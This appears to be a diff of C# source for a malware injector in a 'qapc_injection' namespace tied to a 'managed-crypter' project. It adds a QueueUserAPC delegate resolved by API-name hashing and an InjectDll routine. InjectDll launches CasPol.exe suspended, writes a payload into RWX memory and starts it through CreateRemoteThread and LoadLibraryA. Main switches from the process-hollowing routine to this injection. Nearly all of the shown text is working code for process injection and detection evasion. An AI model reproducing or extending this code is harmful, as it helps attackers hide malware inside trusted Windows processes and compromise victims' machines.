@@ -628,6 +628,19 @@ namespace qapc_injection
 
         #endregion
 
+        #region QueueUserAPC
+
+        #region Definition
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        private delegate uint t_QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+        #endregion  
+
+        private static t_QueueUserAPC QueueUserAPC;
+
+        #endregion
+
         private static T LoadFunction<T>(IntPtr lpModuleBase, uint dwFunctionHash)
         {
             IntPtr lpFunction = GetProcAddress(lpModuleBase, dwFunctionHash);
@@ -654,6 +667,7 @@ namespace qapc_injection
             WriteProcessMemory = LoadFunction<t_WriteProcessMemory>(lpKernel32, FNVHash("WriteProcessMemory"));
             SetThreadContext = LoadFunction<t_SetThreadContext>(lpKernel32, FNVHash("SetThreadContext"));
             ResumeThread = LoadFunction<t_ResumeThread>(lpKernel32, FNVHash("ResumeThread"));
+            QueueUserAPC = LoadFunction<t_QueueUserAPC>(lpKernel32, FNVHash("QueueUserAPC"));
         }
 
         [DllImport("Kernel32.dll")]
@@ -1033,7 +1047,7 @@ namespace qapc_injection
                         0x40);
 
             bResult = v != IntPtr.Zero; //don't need ternarys when using comparison operators, js
-            
+
             //if (v != (IntPtr)pINH.OptionalHeader.ImageBase)
             //    Debugger.Break();
             // so v == 0? lol i thought i caught that
@@ -1043,7 +1057,7 @@ namespace qapc_injection
 
             if (!bResult)
                 return false;
-           
+
             //  }
 
             if ((uint)v == 0)
@@ -1130,6 +1144,54 @@ namespace qapc_injection
             return bResult;
         }
 
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
+        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
+        IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+
+
+        private static void InjectDll(byte[] lpDll)
+        {
+            string pszInstallUtilPath = @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\CasPOl.exe";
+            // pszInstallUtilPath = string.Format("\"{0}\"", pszInstallUtilPath);
+
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+            CreateProcessW(
+                               null,
+                               pszInstallUtilPath,
+                               IntPtr.Zero,
+                               IntPtr.Zero,
+                               false,
+                               0x04,
+                               IntPtr.Zero,
+                               IntPtr.Zero,
+                               ref si,
+                               out pi);
+
+            uint dwDllSize = (uint)lpDll.Length;
+            uint dwWritten = 0;
+
+            IntPtr lpRemoteDll = VirtualAllocEx(pi.hProcess, IntPtr.Zero, dwDllSize, 0x3000, 0x40);
+            WriteProcessMemory(pi.hProcess, lpRemoteDll, lpDll, dwDllSize, ref dwWritten);
+
+            byte* lpImageBase;
+
+            fixed (byte* lpData = &lpDll[0])
+                lpImageBase = lpData;
+
+            IntPtr lpLoadLibrary = GetProcAddress(GetKernel32BaseAddress(), "LoadLibraryA");
+
+            //  QueueUserAPC(lpLoadLibrary, pi.hThread, lpRemoteDll);
+            IntPtr z;
+            CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, lpLoadLibrary, lpRemoteDll, 0, out z);
+            ResumeThread(pi.hThread);
+        }
+
         public static void Main(string[] args)
         {
             InitAPI();
@@ -1140,9 +1202,11 @@ namespace qapc_injection
 
 
             byte[] lpFileBuffer = File.ReadAllBytes("C:\\Users\\Admin\\Desktop\\bintext.exe");
+            byte[] lpDllBuffer = File.ReadAllBytes(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\2inj\bin\Release\2inj.dll");
 
 
-            Run2(lpFileBuffer, pszProcessName);
+            InjectDll(lpDllBuffer);
+            // Run2(lpFileBuffer, pszProcessName);
         }
 
         private static void RunExecRoutine(byte[] lpExe, string pszApplicationPath, string pszCmdLine = default(string))
